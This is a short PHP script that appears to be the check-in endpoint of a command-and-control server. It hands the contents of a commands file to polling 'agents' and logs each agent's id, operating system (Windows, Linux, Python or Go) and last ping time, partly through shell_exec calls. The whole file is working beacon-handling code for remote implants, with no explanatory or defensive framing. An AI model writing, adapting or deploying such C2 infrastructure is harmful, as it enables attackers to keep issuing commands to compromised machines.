<?php

echo file_get_contents("/var/www/html/cmds.txt");

$id = intval($_GET['id']);
$sid = strval($id);
$os = strval($_GET['o']);


if (!empty($id)) {

shell_exec("cat ping.txt | grep -v ".$sid." > temping");
shell_exec("cat temping > ping.txt");

$time = date("Y-m-d H:i:s"); 
$file = 'ping.txt';


if ($os == "W"){
$current = file_get_contents($file);
$current .= "Last Ping - Agent ".$id." (Windows) => ".$time.PHP_EOL;
file_put_contents($file, $current);
}

if ($os == "L"){
$current = file_get_contents($file);
$current .= "Last Ping - Agent ".$id." (Linux) => ".$time.PHP_EOL;
file_put_contents($file, $current);
}

if ($os == "P"){
$current = file_get_contents($file);
$current .= "Last Ping - Agent ".$id." (Python) => ".$time.PHP_EOL;
file_put_contents($file, $current);
}

if ($os == "G"){
$current = file_get_contents($file);
$current .= "Last Ping - Agent ".$id." (Go) => ".$time.PHP_EOL;
file_put_contents($file, $current);
}
 
 
}




?>
